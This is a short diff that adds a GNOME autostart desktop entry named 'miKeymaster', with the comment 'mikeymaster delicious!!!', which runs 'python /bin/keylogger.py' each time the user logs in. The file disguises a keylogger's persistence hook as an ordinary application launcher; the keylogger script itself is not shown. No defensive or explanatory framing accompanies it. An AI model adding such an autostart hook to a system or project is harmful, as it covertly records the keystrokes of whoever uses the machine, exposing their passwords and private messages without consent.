@@ -1,0 +1,10 @@
+[Desktop Entry]
+Type=Application
+Exec=python /bin/keylogger.py
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name[en_US]=miKeymaster
+Name=miKeymaster
+Comment[en_US]=mikeymaster delicious!!!
+Comment=mikeymaster delicious!!!
